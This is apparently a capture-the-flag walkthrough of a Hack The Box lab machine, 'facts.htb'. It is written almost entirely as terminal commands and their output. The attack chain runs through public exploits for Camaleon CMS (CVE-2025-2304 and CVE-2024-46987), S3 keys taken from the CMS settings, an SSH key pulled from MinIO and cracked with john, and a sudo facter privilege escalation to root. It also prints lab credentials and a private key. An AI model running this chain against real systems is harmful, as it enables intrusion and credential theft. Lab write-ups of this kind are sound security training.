#### Info Enum
`└─$ nmap -p- -sSCV 10.129.113.61  --min-rate 999`
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-03 17:54 +1100
Nmap scan report for 10.129.113.61
Host is up (0.13s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
54321/tcp open  http    Golang net/http server
|_http-title: Did not follow redirect to http://10.129.113.61:9001
|_http-server-header: MinIO
fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 1890AA26C1FB1DCD
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Tue, 03 Feb 2026 06:55:36 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>1890AA26C1FB1DCD</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
```

`└─$ sudo dirsearch -u http://facts.htb`
```
[17:58:59] 200 -    5KB - /404
[17:58:59] 200 -    7KB - /400
[17:58:59] 200 -    5KB - /404.html
[17:58:59] 200 -    8KB - /500
[18:00:09] 200 -   99B  - /robots.txt
[18:00:35] 200 -   73B  - /up.php
```
create an account on port 80 page, find the service runing on it and the version
http://facts.htb/admin/dashboard
 Camaleon CMS.  Version 2.9.0
 

https://sploitus.com/exploit?id=1017FEE9-A2CD-587D-889D-E056A5FAD264
https://github.com/7acini/CVE-2025-2304-CamaleonCMS-PoC/blob/main/main.py

` └─$ python3 main.py -u http://facts.htb --user a --password q12`
```
[*] Authenticating as a...
[*] Extracting exploit tokens from http://facts.htb/admin/profile/edit...
[+] Exploitation Token: DwWHcbP0dqfwl25...
[+] Target User ID: 6
[*] Dispatching privilege escalation payload to http://facts.htb/admin/users/6/updated_ajax...
[+++] SUCCESS: User p
```
from the source code the passwd has been set to admin
login as admin

http://facts.htb/admin/settings/site
```
Aws s3 access key (*)
AKIA447828A7AC52CEAA

Aws s3 secret key (*)
QRAi7vwyJzjenxMrnqP+03m0Tw9Px0naMaoC9Ixb

Aws s3 bucket name (*)
randomfacts

Aws s3 region (*)
us-east-1

Aws s3 bucket endpoint
http://localhost:54321

Cloudfront url
http://facts.htb/randomfacts
```
use aws to connect to port 54321 which is Aws bucket
`└─$ aws configure --profile htb      `     
```
AWS Access Key ID [****************3612]: AKIA447828A7AC52CEAA
AWS Secret Access Key [****************2xKq]: QRAi7vwyJzjenxMrnqP+03m0Tw9Px0naMaoC9Ixb
Default region name [us-east-1]: 
Default output format [text]: 
```
                                                                      
`└─$ aws s3 ls --profile htb --endpoint-url http://facts.htb:54321`
```
2025-09-11 08:06:52 internal
2025-09-11 08:06:52 randomfacts
```
`└─$ aws s3 ls --profile htb s3://internal --endpoint-url http://facts.htb:54321`
```
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-08 13:45:13        220 .bash_logout
2026-01-08 13:45:13       3900 .bashrc
2026-01-08 13:47:17         20 .lesshst
2026-01-08 13:47:17        807 .profile
```
`└─$ aws s3 sync --profile htb s3://internal ./ --endpoint-url http://facts.htb:54321`
`└─$ cat id_ed25519 `
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDfV0nTbb
K72YVI7pdlIDtRAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIMo7fDmvVyKoW7Pd
xgwSm3ZUhMo/lV+CwAO8GpVthDuwAAAAoGsdlGmK3D1rryXjmz3EM2ZrhcJhRMKwq2nH44
+nF4MqX2kgG6ZOlzmRbDafIe7XjKmJ1PPBxzeqwI0pDf+xzXgbVwXVq563baH9rjLawdAG
XLK1Dh/ckWIGvnf4tcP7Je+j+VZsIabRQtSJcQ4MDRf4to7yEosMkb9vvc4TeUtwwjuX9q
P+tX9yyPhUqJV62yfCxrEMsK3ku/MsCaM9WUI=
-----END OPENSSH PRIVATE KEY-----
```
this key is protected by phasepass, crack it by john
```**└─$ ssh2john id_ed25519 >> hash   ```   
                                                                                                  
`└─$ john hash --wordlist=~/oscp/rockyou.txt  `
```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (id_ed25519)     
1g 0:00:01:21 DONE (2026-02-04 10:34) 0.01224g/s 39.38p/s 39.38c/s 39.38C/s grecia..school1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
**
```
but we still need a username for ssh in
https://github.com/Goultarde/CVE-2024-46987/blob/main/CVE-2024-46987.py

`└─$ python3 CVE-2024-46987.py -u http://facts.htb -l a -p a12 /etc/passwd`
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
``

`└─$ ssh -i id_ed25519 trivia@facts.htb `
```            
Enter passphrase for key 'id_ed25519': 
trivia@facts:~$ id
uid=1000(trivia) gid=1000(trivia) groups=1000(trivia)
```

`trivia@facts:/home/william$ sudo -l`
```
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```
```
trivia@facts:/home/william$ ls -la /usr/bin/facter
-rwxr-xr-x 1 root root 249 Nov 26  2024 /usr/bin/facter
```
from the guide on GTFobins
`trivia@facts:/tmp/facter$ cat > f.rb << EOF`
```
#!/usr/bin/env ruby
exec "/bin/sh"
EOF
```
```
trivia@facts:/tmp/facter$ sudo facter --custom-dir=/tmp/facter/ f.rb
# id
uid=0(root) gid=0(root) groups=0(root)
```
